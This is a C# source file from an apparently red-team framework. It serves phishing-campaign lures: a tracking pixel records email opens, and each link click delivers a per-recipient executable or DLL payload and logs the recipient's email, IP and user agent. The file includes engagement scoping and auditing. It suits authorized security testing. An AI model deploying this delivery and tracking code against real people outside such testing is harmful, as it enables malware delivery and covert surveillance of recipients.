using Rod.Audit;
using Rod.CoreState;
using Rod.CoreState.Campaigns;
using Rod.CoreState.Live;
using Rod.CoreState.Operators;
using Rod.Transport.Listeners;

namespace Rod.Transport.Endpoints;

// The lure serving core (architecture.md Sec 11.5, Sec 8): the
// transport-neutral half of the campaign edge. The unguessable route id is
// the credential -- the capability-URL shape -- so the route serves without
// a header or a token, the shape a link click can carry. The link both
// records the click and delivers the recipient's built artifact (the click
// is the evidence and the delivery); the pixel records the open and answers
// a 1x1 gif. The ingress listener answers for the campaign's engagement,
// the same refusal the enroll and fetch routes run, so a shared-tier front
// carries no lure and a revoked campaign's lures are indistinguishable from
// nonexistent ones.

/// <summary>
/// Serves one lure fetch: the link (click plus artifact) or the open pixel.
/// The scope is the ingress listener -- null keeps the permissive
/// in-memory-harness shape the HTTP route ran before the extraction.
/// </summary>
internal static class LureServingCore
{
    // The 1x1 transparent gif the pixel route answers -- the only body an
    // <img> tag needs, small enough that the open's cost is the request
    // itself. Inline rather than a file: it is a constant, not an asset.
    private static readonly byte[] Pixel = Convert.FromBase64String(
        "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7");

    public static async Task<ServedRoute> ServeAsync(
        Guid lureId,
        bool pixel,
        Listener? ingress,
        RouteWireFacts facts,
        ICampaignStore campaigns,
        IPayloadStore payloads,
        IAuditStore audit,
        ILiveEventBus live,
        TimeProvider clock,
        CancellationToken cancellationToken)
    {
        var lure = await campaigns.FindByLureAsync(lureId, cancellationToken);
        if (lure is null)
            return ServedRoute.NotFound();

        // The scope refusal the enroll and fetch routes run.
        if (ingress is not null && ingress.EngagementId != lure.EngagementId)
            return ServedRoute.NotFound();

        var campaign = await campaigns.FindAsync(lure.CampaignId, cancellationToken);
        if (campaign is null || campaign.State == CampaignState.Revoked)
            return ServedRoute.NotFound();

        if (pixel)
        {
            await RecordServeAsync(campaigns, audit, live, clock, facts, lure, click: false, served: true, cancellationToken);
            return new ServedRoute(200, "image/gif", Pixel)
            {
                Headers = NoStore(),
            };
        }

        // The artifact must exist before the lure can deliver it: the link
        // exists from creation, the artifact only once the per-recipient
        // build lands. A click that arrives before then 404s -- evidence of
        // interest the trail keeps below, but nothing to serve.
        if (lure.PayloadId is not { } payloadId)
        {
            await RecordServeAsync(campaigns, audit, live, clock, facts, lure, click: true, served: false, cancellationToken);
            return ServedRoute.NotFound();
        }

        var payload = await payloads.FindAsync(payloadId, lure.EngagementId.Value, cancellationToken);
        if (payload is null)
            return ServedRoute.NotFound();

        await RecordServeAsync(campaigns, audit, live, clock, facts, lure, click: true, served: true, cancellationToken);

        // The download's shape follows the artifact's, the library download's
        // own rule: a zip bundle keeps its zip name, a Windows executable
        // carries .exe, everything else the extensionless .bin.
        var extension =
            payload.ContentType == "application/zip" ? ".dll.zip"
            : payload.Target?.StartsWith("windows", StringComparison.OrdinalIgnoreCase) == true ? ".exe"
            : ".bin";
        var fileName = $"rod-{payload.Class.ToLowerInvariant()}-{payload.PayloadId.ToString("N")[..8]}{extension}";
        return new ServedRoute(200, payload.ContentType, payload.Content, fileName)
        {
            Headers = NoStore(),
        };
    }

    // no-store both ways: a cached lure serves a stale bake.
    private static Dictionary<string, string> NoStore()
        => new(StringComparer.OrdinalIgnoreCase) { ["Cache-Control"] = "no-store" };

    // Records one serve -- the evidence stamp on the recipient row, the
    // audit fact, and the live event -- whether the route had an artifact
    // to deliver or not.
    private static async Task RecordServeAsync(
        ICampaignStore campaigns,
        IAuditStore audit,
        ILiveEventBus live,
        TimeProvider clock,
        RouteWireFacts facts,
        CampaignLure lure,
        bool click,
        bool served,
        CancellationToken cancellationToken)
    {
        var at = clock.GetUtcNow();

        if (click)
            await campaigns.NoteClickedAsync(lure.CampaignId, lure.RecipientId, at, cancellationToken);
        else
            await campaigns.NoteOpenedAsync(lure.CampaignId, lure.RecipientId, at, cancellationToken);

        await audit.AppendAsync(
            AuditEvent.Fact(
                eventId: Guid.NewGuid(),
                engagementId: lure.EngagementId.Value,
                operatorId: OperatorId.Empty.Value,
                implantId: Guid.Empty,
                taskId: Guid.Empty,
                verb: click ? "campaign.click" : "campaign.open",
                kind: AuditEventKind.CampaignLinkServed,
                payload: $"campaign='{lure.CampaignName}' ({lure.CampaignId}) "
                    + $"recipient={lure.RecipientEmail} "
                    + $"{(click ? "click" : "open")}={(served ? "served" : "no-artifact")} "
                    + $"remote={facts.Peer} {facts.ListenerFact} "
                    + $"ua={(string.IsNullOrWhiteSpace(facts.UserAgent) ? "none" : facts.UserAgent)}",
                output: null,
                outcome: lure.RecipientId.ToString(),
                at),
            cancellationToken);

        await live.PublishAsync(
            LiveEvent.CampaignActivity(
                lure.EngagementId,
                OperatorId.Empty,
                $"{(click ? "clicked" : "opened")} recipient={lure.RecipientEmail} campaign={lure.CampaignId}",
                at),
            cancellationToken);
    }
}
